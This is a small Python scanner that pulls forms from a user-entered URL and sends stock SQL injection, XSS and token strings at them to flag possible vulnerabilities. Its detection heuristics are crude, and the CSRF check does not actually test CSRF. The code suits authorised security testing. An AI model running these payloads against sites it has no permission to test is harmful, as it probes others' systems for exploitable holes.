import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Define payloads for testing vulnerabilities
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1 --", "' OR 'a'='a' --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
CSRF_PAYLOADS = ["csrf_token=malicious_token"]

# Function to test for SQL Injection
def test_sqli(url, params):
    print(f"[*] Testing for SQL Injection on {url}")
    for payload in SQLI_PAYLOADS:
        test_params = {k: payload for k in params.keys()}
        response = requests.get(url, params=test_params)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            return True
    print("[*] No SQL Injection vulnerabilities detected.")
    return False

# Function to test for XSS
def test_xss(url, params):
    print(f"[*] Testing for XSS on {url}")
    for payload in XSS_PAYLOADS:
        test_params = {k: payload for k in params.keys()}
        response = requests.get(url, params=test_params)
        if payload in response.text:
            print(f"[!] Possible XSS vulnerability found with payload: {payload}")
            return True
    print("[*] No XSS vulnerabilities detected.")
    return False

# Function to test for CSRF
def test_csrf(url, form_action):
    print(f"[*] Testing for CSRF on {url}")
    csrf_url = urljoin(url, form_action)
    for payload in CSRF_PAYLOADS:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(csrf_url, data=payload, headers=headers)
        if response.status_code == 200 and "success" in response.text.lower():
            print(f"[!] Possible CSRF vulnerability found with payload: {payload}")
            return True
    print("[*] No CSRF vulnerabilities detected.")
    return False

# Function to extract forms from a webpage
def extract_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    forms = soup.find_all("form")
    return forms

# Main function to scan a website
def scan_website(url):
    print(f"[*] Scanning {url} for vulnerabilities...")
    forms = extract_forms(url)

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        params = {input.get("name"): input.get("value", "") for input in inputs}

        if method == "get":
            target_url = urljoin(url, action)
            test_sqli(target_url, params)
            test_xss(target_url, params)
        elif method == "post":
            target_url = urljoin(url, action)
            test_csrf(target_url, action)

# Entry point
if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    scan_website(target_url)
